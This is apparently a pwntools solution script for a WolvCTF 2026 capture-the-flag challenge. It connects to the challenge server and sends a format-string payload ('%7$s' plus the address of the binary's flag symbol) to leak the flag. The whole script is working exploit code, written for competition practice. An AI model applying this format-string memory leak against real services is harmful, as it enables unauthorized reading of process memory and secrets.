from pwn import *

elf = context.binary = ELF('./comment')
# p = process()
p = remote('comment-card.wolvctf-2026.kctf.cloud', 1337)
rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

payload = flat(
    '%7$s', p32(0),
    elf.sym['flag'],
)

p.sendlineafter('comment: ', payload)
p.interactive()